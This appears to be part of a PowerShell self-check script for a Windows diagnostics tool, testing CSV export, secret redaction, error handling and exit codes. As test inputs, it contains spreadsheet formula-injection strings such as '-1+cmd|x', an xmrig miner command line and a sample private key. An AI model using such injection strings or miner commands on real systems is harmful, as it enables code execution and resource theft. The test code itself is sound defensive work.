    $argLine = New-Object 'System.Collections.Generic.List[string]'
    $argLine.Add('-NoProfile'); $argLine.Add('-NonInteractive'); $argLine.Add('-ExecutionPolicy'); $argLine.Add('Bypass')
    $argLine.Add('-File'); $argLine.Add((ConvertTo-CommandLineArgument -Text $stubPath))
    $argLine.Add('-Out'); $argLine.Add((ConvertTo-CommandLineArgument -Text $outPath))
    foreach ($a in $argCases) { $argLine.Add((ConvertTo-CommandLineArgument -Text $a)) }
    $argLine.Add('-Elevated')
    try {
        $proc = Start-Process -FilePath $psExe -ArgumentList $argLine.ToArray() -Wait -PassThru -WindowStyle Hidden -ErrorAction Stop
        $received = @()
        if ([IO.File]::Exists($outPath)) { $received = @([IO.File]::ReadAllLines($outPath, (New-Object System.Text.UTF8Encoding($true)))) }
        Assert-Check -Condition ($proc.ExitCode -eq 0) -Detail ('argument round trip: child exit code {0}' -f $proc.ExitCode)
        Assert-Check -Condition ($received.Count -eq ($argCases.Count + 1)) -Detail ('argument round trip: expected {0} arguments, child received {1}: {2}' -f ($argCases.Count + 1), $received.Count, ($received -join ' | '))
        for ($i = 0; $i -lt $argCases.Count -and $i -lt $received.Count; $i++) {
            Assert-Check -Condition ($received[$i] -eq $argCases[$i]) -Detail ('argument round trip: sent [{0}] received [{1}]' -f $argCases[$i], $received[$i])
        }
        if ($received.Count -gt $argCases.Count) { Assert-Check -Condition ($received[$argCases.Count] -eq '-Elevated') -Detail 'argument round trip: trailing -Elevated switch was swallowed' }
    } catch {
        Assert-Check -Condition $false -Detail ('argument round trip could not run: {0}' -f $_.Exception.Message)
    }

    # CSV formula guard: text starting with = + @ - TAB gets a leading space; only whole numbers keep a leading "-".
    foreach ($pair in @(@('-5', '-5'), @('-1.50', '-1.50'), @('-1,5', '-1,5'), @('-2+3', ' -2+3'), @('-1+cmd|x', ' -1+cmd|x'), @('-Command x', ' -Command x'), @('=1+1', ' =1+1'), @('plain', 'plain'), @('', ''))) {
        $got = Protect-WdCsvText -Text $pair[0]
        Assert-Check -Condition ($got -ceq $pair[1]) -Detail ('Protect-WdCsvText [{0}] must give [{1}], got [{2}]' -f $pair[0], $pair[1], $got)
    }
    $csvPath = [IO.Path]::Combine($tempRoot, 'guard.csv')
    Export-CsvInvariant -InputObject @([pscustomobject][ordered]@{ Name = 'evil'; Command = '=1+1'; Neg = -1.5; NegText = '-5'; Dash = '-Command x'; Plus = '+7'; At = '@SUM(A1)'; Path = 'C:\ok.exe'; Expr = '-2+3'; NegDec = '-1.50' }) -Path $csvPath
    $csvLines = @([IO.File]::ReadAllLines($csvPath))
    Assert-Check -Condition ($csvLines.Count -eq 2) -Detail ('CSV guard: expected header + 1 row, got {0} lines' -f $csvLines.Count)
    if ($csvLines.Count -eq 2) {
        $row = $csvLines[1]
        Assert-Check -Condition ($row -eq '"evil"," =1+1","-1.50","-5"," -Command x"," +7"," @SUM(A1)","C:\ok.exe"," -2+3","-1.50"') -Detail ('CSV guard: unexpected row {0}' -f $row)
    }

    # Export-CsvInvariant -Columns: an empty result gets the quoted header line (UTF-8 BOM); rows get the fixed column
    # order with missing columns as empty cells and unlisted properties appended.
    $emptyCsv = [IO.Path]::Combine($tempRoot, 'empty-schema.csv')
    Export-CsvInvariant -InputObject @() -Path $emptyCsv -Columns @('Name', 'Status', 'Code')
    $emptyBytes = [IO.File]::ReadAllBytes($emptyCsv)
    $emptyLines = @([IO.File]::ReadAllLines($emptyCsv, (New-Object System.Text.UTF8Encoding($true))))
    Assert-Check -Condition ((Test-HasBom -Bytes $emptyBytes) -and $emptyLines.Count -eq 1 -and $emptyLines[0] -eq '"Name","Status","Code"') -Detail ('Export-CsvInvariant -Columns on an empty result must write the quoted header line, got {0} line(s): {1}' -f $emptyLines.Count, ($emptyLines -join ' | '))
    $emptyNoSchema = [IO.Path]::Combine($tempRoot, 'empty-noschema.csv')
    Export-CsvInvariant -InputObject @() -Path $emptyNoSchema
    Assert-Check -Condition ([IO.File]::ReadAllBytes($emptyNoSchema).Length -eq 3) -Detail 'Export-CsvInvariant without -Columns on an empty result must write a BOM-only file'
    $schemaCsv = [IO.Path]::Combine($tempRoot, 'schema.csv')
    Export-CsvInvariant -InputObject @([pscustomobject][ordered]@{ Code = 3; Name = 'a'; Extra = 'x' }, [pscustomobject][ordered]@{ Name = 'b'; Status = 'ok' }) -Path $schemaCsv -Columns @('Name', 'Status', 'Code')
    $schemaLines = @([IO.File]::ReadAllLines($schemaCsv))
    Assert-Check -Condition ($schemaLines.Count -eq 3 -and $schemaLines[0] -eq '"Name","Status","Code","Extra"' -and $schemaLines[1] -eq '"a","","3","x"' -and $schemaLines[2] -eq '"b","ok","",""') -Detail ('Export-CsvInvariant -Columns must fix the order and fill missing cells, got: {0}' -f ($schemaLines -join ' | '))
    @([pscustomobject][ordered]@{ Name = 'p' }) | Export-CsvInvariant -Path ([IO.Path]::Combine($tempRoot, 'pipe.csv')) -Columns @('Name', 'Status')
    $pipeLines = @([IO.File]::ReadAllLines([IO.Path]::Combine($tempRoot, 'pipe.csv')))
    Assert-Check -Condition ($pipeLines.Count -eq 2 -and $pipeLines[0] -eq '"Name","Status"' -and $pipeLines[1] -eq '"p",""') -Detail ('Export-CsvInvariant -Columns via the pipeline, got: {0}' -f ($pipeLines -join ' | '))

    # Hide-WdSecret: key names stay, values become ***; miner pool/wallet arguments are evidence and stay visible.
    foreach ($pair in @(
        @('[Interface] PrivateKey = yAnz5TF+lXXJte14tji3zlMNq+hd2rYUIgJBgB3fBmk=', '[Interface] PrivateKey = ***'),
        @('tool.exe --password hunter2 --port 5', 'tool.exe --password *** --port 5'),
        @('tool.exe --password "long secret phrase" --port 5', 'tool.exe --password "***" --port 5'),
        @("tool.exe --token 'two words' --port 5", "tool.exe --token '***' --port 5"),
        @('{"password": "long secret phrase"}', '{"password": "***"}'),
        @('{"token": "one\"two words"}', '{"token": "***"}'),
        @('{"token": "abc.def"}', '{"token": "***"}'),
        @('xmrig -o pool:4444 -u 48abc', 'xmrig -o pool:4444 -u 48abc'))) {
        $got = Hide-WdSecret -Text $pair[0]
        Assert-Check -Condition ($got -ceq $pair[1]) -Detail ('Hide-WdSecret [{0}] must give [{1}], got [{2}]' -f $pair[0], $pair[1], $got)
    }

    # Invoke-Safely: a long exception message is capped at 1000 characters with a truncation suffix.
    $longMsg = 'x' * 3000
    $before = $script:CollectionErrors.Count
    $r = Invoke-Safely -Name 'SelfCheck.Long' -Quiet -Default 'dflt' -ScriptBlock { throw $longMsg }
    $recorded = ''
    if ($script:CollectionErrors.Count -gt $before) { $recorded = [string]$script:CollectionErrors[$script:CollectionErrors.Count - 1]['Error'] }
    Assert-Check -Condition ($r -eq 'dflt' -and $script:CollectionErrors.Count -eq ($before + 1) -and $recorded.Length -lt 1050 -and $recorded.EndsWith(' ... [truncated, 3000 chars]')) -Detail ('Invoke-Safely must cap the message at 1000 chars with a suffix; recorded {0} chars ending with [{1}]' -f $recorded.Length, $(if ($recorded.Length -gt 40) { $recorded.Substring($recorded.Length - 40) } else { $recorded }))
    $script:CollectionErrors.RemoveAt($script:CollectionErrors.Count - 1)

    # Admin skips are not collection errors: a message ending with "(requires administrator)" lands only in Get-AdminSkips.
    $before = $script:CollectionErrors.Count
    $skipsBefore = @(Get-AdminSkips).Count
    [void](Invoke-Safely -Name 'SelfCheck.AdminOnly' -Quiet -ScriptBlock { throw 'SMART data is not readable (requires administrator)' })
    $skipsNow = @(Get-AdminSkips)
    Assert-Check -Condition ($script:CollectionErrors.Count -eq $before -and $skipsNow.Count -eq ($skipsBefore + 1) -and [string]$skipsNow[$skipsNow.Count - 1]['Item'] -eq 'SelfCheck.AdminOnly') -Detail ('Invoke-Safely with a "(requires administrator)" message must register an admin skip and no collection error (errors {0} -> {1}, skips {2} -> {3})' -f $before, $script:CollectionErrors.Count, $skipsBefore, $skipsNow.Count)
    if (-not $script:IsAdmin) {
        $before = $script:CollectionErrors.Count
        $skipsBefore = @(Get-AdminSkips).Count
        $ev = @(Get-WinEventSafe -FilterHashtable @{ LogName = 'Security'; Id = 4624 } -MaxEvents 1)
        $skipsNow = @(Get-AdminSkips)
        Assert-Check -Condition ($ev.Count -eq 0 -and $script:CollectionErrors.Count -eq $before -and $skipsNow.Count -eq ($skipsBefore + 1) -and [string]$skipsNow[$skipsNow.Count - 1]['Item'] -eq 'Event log Security') -Detail ('Get-WinEventSafe on the Security log without administrator rights must give 0 collection errors and 1 admin skip (errors {0} -> {1}, skips {2} -> {3})' -f $before, $script:CollectionErrors.Count, $skipsBefore, $skipsNow.Count)
    }

    # Every summary carries the privacy notice.
    $runInfo = @(Get-RunInfoSectionLines -Mode 'selfcheck')
    Assert-Check -Condition (@($runInfo | Where-Object { $_ -like '- Privacy: this report and its CSV/JSON files contain personal data*' }).Count -eq 1) -Detail 'Get-RunInfoSectionLines must contain the "- Privacy:" line'

    # bigint in JSON: a number when it fits into int64, otherwise a numeric string (never a property bag).
    $json = ConvertTo-JsonReady -Value ([ordered]@{ Small = [bigint]5; Big = [bigint]::Parse('12345678901234567890') }) | ConvertTo-Json -Compress
    Assert-Check -Condition ($json -eq '{"Small":5,"Big":"12345678901234567890"}') -Detail ('bigint JSON: got {0}' -f $json)

    # Write-Log never throws, even for an unknown level under $ErrorActionPreference = 'Stop'.
    $threw = $false
    $badLevel = 'Warn' + 'ing'   # built at runtime so that the hygiene check above does not flag this line
    try { Write-Log -Level $badLevel -Message 'self-check' -NoConsole } catch { $threw = $true }
    Assert-Check -Condition (-not $threw) -Detail 'Write-Log with an invalid level literal must not throw'

    # Get-WinEventSafe: an empty query is not a collection error, whatever the UI language.
    $savedUi = [Threading.Thread]::CurrentThread.CurrentUICulture
    try {
        try { [Threading.Thread]::CurrentThread.CurrentUICulture = [Globalization.CultureInfo]::GetCultureInfo('ru-RU') } catch { }
        $before = $script:CollectionErrors.Count
        $ev = @(Get-WinEventSafe -FilterHashtable @{ LogName = 'Application'; Id = 999999 } -MaxEvents 1)
        Assert-Check -Condition ($ev.Count -eq 0 -and $script:CollectionErrors.Count -eq $before) -Detail ('Get-WinEventSafe: empty query under ru-RU UI culture produced {0} collection error(s)' -f ($script:CollectionErrors.Count - $before))
    } finally {
        try { [Threading.Thread]::CurrentThread.CurrentUICulture = $savedUi } catch { }
    }
}
$summary.Add([pscustomobject]@{ Check = 'Common.ps1 behaviour'; Files = 1; Failures = $script:behaviourFailures })

# ---------------------------------------------------------------------------------------------
# (h) Entry-point exit codes (needs a local path: WinDebug.ps1 refuses UNC locations with exit 2)
# ---------------------------------------------------------------------------------------------
$script:entryFailures = 0
$entryPoint = [IO.Path]::Combine($Path, 'WinDebug.ps1')
if ($Path.StartsWith('\\')) {
    Write-Host '  entry-point checks skipped (repository is on a UNC path; run from a local mirror to include them)' -ForegroundColor DarkGray
} elseif ([IO.File]::Exists($entryPoint)) {
    function Invoke-EntryPoint {
        [CmdletBinding()]
        param([string[]]$Arguments)
        $list = New-Object 'System.Collections.Generic.List[string]'
        $list.Add('-NoProfile'); $list.Add('-NonInteractive'); $list.Add('-ExecutionPolicy'); $list.Add('Bypass')
        $list.Add('-File'); $list.Add((ConvertTo-CommandLineArgument -Text $entryPoint))
        foreach ($a in $Arguments) { if ($a -like '-*') { $list.Add($a) } else { $list.Add((ConvertTo-CommandLineArgument -Text $a)) } }
        # Redirected (empty) stdin: the entry point must not wait for the elevation question or the menu.
        # Its console output goes to a scratch file so the self-check output stays readable.
        $p = Start-Process -FilePath $psExe -ArgumentList $list.ToArray() -Wait -PassThru -WindowStyle Hidden -RedirectStandardInput $emptyInput -RedirectStandardOutput ([IO.Path]::Combine($tempRoot, 'entry-stdout.txt')) -RedirectStandardError ([IO.Path]::Combine($tempRoot, 'entry-stderr.txt')) -ErrorAction Stop
        return [int]$p.ExitCode
    }
    function Assert-Entry {
        [CmdletBinding()]
        param([bool]$Condition, [string]$Detail)
        if (-not $Condition) { $script:entryFailures++; Add-CheckFailure -Check 'EntryPoint' -File 'WinDebug.ps1' -Detail $Detail }
    }
    $outRoot = [IO.Path]::Combine($tempRoot, 'reports')
    $emptyFolder = [IO.Path]::Combine($tempRoot, 'not-a-session')
    [void][IO.Directory]::CreateDirectory($emptyFolder)
    $emptyInput = [IO.Path]::Combine($tempRoot, 'empty-stdin.txt')
    [IO.File]::WriteAllText($emptyInput, '')
    try {
        $rc = Invoke-EntryPoint -Arguments @('-Mode', 'Analyze', '-NoElevate', '-SessionPath', $emptyFolder, '-OutputRoot', $outRoot)
        Assert-Entry -Condition ($rc -eq 5) -Detail ('Analyze with a non-session folder must exit 5, got {0}' -f $rc)
        Assert-Entry -Condition (-not [IO.File]::Exists([IO.Path]::Combine($emptyFolder, 'analyze.log'))) -Detail 'Analyze must not write analyze.log into a folder that is not a session'
        Assert-Entry -Condition (@([IO.Directory]::GetFileSystemEntries($emptyFolder)).Count -eq 0) -Detail 'Analyze must leave a non-session folder untouched'
        $rc = Invoke-EntryPoint -Arguments @('-Mode', 'Analyze', '-NoElevate', '-OutputRoot', $outRoot)
        Assert-Entry -Condition ($rc -eq 5) -Detail ('Analyze without any session must exit 5, got {0}' -f $rc)
        $rc = Invoke-EntryPoint -Arguments @('-Mode', 'Bogus', '-NoElevate', '-OutputRoot', $outRoot)
        Assert-Entry -Condition ($rc -eq 5) -Detail ('unknown -Mode must exit 5, got {0}' -f $rc)
        $rc = Invoke-EntryPoint -Arguments @('-Mode', 'Disk', '-TopN', '2', '-NoElevate', '-OutputRoot', $outRoot)
        Assert-Entry -Condition ($rc -eq 5) -Detail ('-TopN out of range must exit 5, got {0}' -f $rc)
        foreach ($badDrive in @('bogus', '1', 'C,bogus', '')) {
            $rc = Invoke-EntryPoint -Arguments @('-Mode', 'Disk', '-Drives', $badDrive, '-NoElevate', '-OutputRoot', $outRoot)
            Assert-Entry -Condition ($rc -eq 5) -Detail ('invalid -Drives [{0}] must exit 5, got {1}' -f $badDrive, $rc)
        }
        $rc = Invoke-EntryPoint -Arguments @('-Mode', 'Analyze', '-NoElevate', '-Drives', 'C', 'D', '-OutputRoot', $outRoot)
        Assert-Entry -Condition ($rc -eq 1) -Detail ('a stray positional token must fail binding (exit 1), got {0}' -f $rc)
        $rc = Invoke-EntryPoint -Arguments @('-StopMonitor', '-NoElevate', '-OutputRoot', $outRoot)
        Assert-Entry -Condition ($rc -eq 3) -Detail ('-StopMonitor with nothing running must exit 3, got {0}' -f $rc)
        Assert-Entry -Condition (-not [IO.Directory]::Exists($outRoot) -or @([IO.Directory]::GetFileSystemEntries($outRoot)).Count -eq 0) -Detail 'refused runs must not create report folders'
    } catch {
        Assert-Entry -Condition $false -Detail ('entry-point checks could not run: {0}' -f $_.Exception.Message)
    }
    $summary.Add([pscustomobject]@{ Check = 'Entry-point exit codes'; Files = 1; Failures = $script:entryFailures })
}

try { if ([IO.Directory]::Exists($tempRoot)) { [IO.Directory]::Delete($tempRoot, $true) } } catch { }

# ---------------------------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------------------------
Write-Host ''
Write-Host ('{0,-28} {1,6} {2,9}' -f 'Check', 'Files', 'Failures')
Write-Host ('{0,-28} {1,6} {2,9}' -f '-----', '-----', '--------')
foreach ($s in $summary) {
    $color = 'Green'
    if ($s.Failures -gt 0) { $color = 'Red' }
    Write-Host ('{0,-28} {1,6} {2,9}' -f $s.Check, $s.Files, $s.Failures) -ForegroundColor $color
}
Write-Host ''
if ($failures.Count -gt 0) {
    Write-Host ('{0} failure(s):' -f $failures.Count) -ForegroundColor Red
    foreach ($f in $failures) {
        $rel = $f.File
        if ($rel.StartsWith($Path, [StringComparison]::OrdinalIgnoreCase)) { $rel = $rel.Substring($Path.Length).TrimStart('\') }
        Write-Host ('  [{0}] {1}: {2}' -f $f.Check, $rel, $f.Detail) -ForegroundColor Red
    }
    exit 1
}
Write-Host 'All checks passed.' -ForegroundColor Green
exit 0
